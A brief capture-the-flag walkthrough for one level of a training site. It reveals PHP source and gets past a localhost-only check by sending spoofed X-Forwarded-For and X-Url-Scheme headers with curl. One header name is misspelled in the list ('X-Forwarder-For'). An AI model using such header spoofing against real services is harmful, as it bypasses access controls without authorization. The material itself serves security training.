# Level-27

Level27-28 (https://matrix.voorivex.academy/the-final-fight-57a31594d5784b29e02960fd427f8703/)

send this request:

```text
https://matrix.voorivex.academy/the-final-fight-57a31594d5784b29e02960fd427f8703/?show-me-the-codes
```

you will get a php code:

```php
<?php
if (isset($_GET['show-me-the-codes'])) {
    show_source("index.php");
    exit();
}

if ($_GET['code1'] !== $_GET['code2']) {
    if (md5($_GET['code1']) === md5($_GET['code2'])) {
        require_once('next.php');
        die($next);
    }
}


?>
```

if you send a request like this, you will get an error:

```text
https://matrix.voorivex.academy/the-final-fight-57a31594d5784b29e02960fd427f8703/?code=1

only accessible from 127.0.0.1 over http schema
```

you should provide two additional headers:

- X-Forwarder-For
- X-Url-Scheme

send this request:

```text
curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Url-Scheme: http" https://matrix.voorivex.academy/the-final-fight-57a31594d5784b29e02960fd427f8703/?code=1
```

you will get this:

```text
the-final-fight-b1f6bb930427fc161f4fbb8ccdf06eca
```

go to:

```text
https://matrix.voorivex.academy/the-final-fight-b1f6bb930427fc161f4fbb8ccdf06eca
```









